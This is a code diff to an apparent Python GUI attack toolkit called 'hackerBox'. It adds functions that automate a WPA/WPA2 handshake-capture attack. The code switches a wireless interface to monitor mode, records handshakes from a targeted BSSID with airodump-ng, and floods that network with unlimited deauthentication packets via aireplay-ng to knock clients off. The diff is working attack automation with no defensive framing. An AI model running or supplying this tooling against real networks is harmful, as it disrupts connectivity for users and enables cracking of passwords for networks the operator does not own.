@@ -72,3 +72,54 @@ def wpaWpa2CrackingHub(interface, targetBssid, targetChannel):
                                         stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     deauthIntProcessThread = threading.Thread(args=(deauthIntProcess,))
     deauthIntProcessThread.start()
+    
+def startWpaWpa2CrackingChain(queue, interface, targetBssid, targetChannel, terminalContentFrame, errorOutputContentFrame) :
+    try :
+        terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+        errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+        terminalLabel.pack(anchor = NW)
+        errorOutputLabel.pack(anchor = NW)
+
+        killConflictProcess = subprocess.Popen(["airmon-ng", "check", "kill"])
+
+        setIntToMonitorProcess = subprocess.Popen (["airmon-ng", "start", interface], 
+                                                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        setIntToMonitorStdout, setIntToMonitorStderr = setIntToMonitorProcess.communicate()
+        terminalLabel["text"] += "\n$ " + setIntToMonitorStdout.decode() + "\n"
+
+        interface += "mon"
+        terminalLabel["text"] += "\n$ Starting to listen for Interface Handshake\n"
+        crackWpaWpa2HandshakeProcess = subprocess.Popen (["airodump-ng", "-w", 
+                                                        "WifiHacking/PageWpaWpa2Cracking/crackedHandshakes/hackerBox_crackedWpaWpa2Handshake", 
+                                                        "-c", targetChannel, "--bssid", targetBssid, interface], 
+                                                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        crackWpaWpa2HandshakeThread = threading.Thread(args=(crackWpaWpa2HandshakeProcess,))
+        crackWpaWpa2HandshakeThread.start()
+        
+        terminalLabel["text"] += "\n$ Starting to deauthenticate target Interface\n"
+        deauthIntProcess = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", targetBssid, interface], 
+                                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        deauthIntProcessThread = threading.Thread(args=(deauthIntProcess,))
+        deauthIntProcessThread.start()
+
+        queue.put((crackWpaWpa2HandshakeThread, deauthIntProcessThread))
+    except Exception as e :
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+
+def stopWpaWpa2CrackingChain(interface, chainTerminalContentFrame, chainErrorContentFrame) :
+    try:
+        chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+        chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+        chainTerminalLabel.pack(anchor = NW)
+        chainErrorOutputLabel.pack(anchor = NW)
+        
+        chainTerminalLabel["text"] += "\n$ Stopping WPA / WPA2 Cracking...\n\n"
+
+        interface += "mon"
+        subprocess.call(["airmon-ng", "stop", interface])
+
+        chainTerminalLabel["text"] += "$ WPA / WPA2 Cracking successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        chainErrorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        chainErrorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
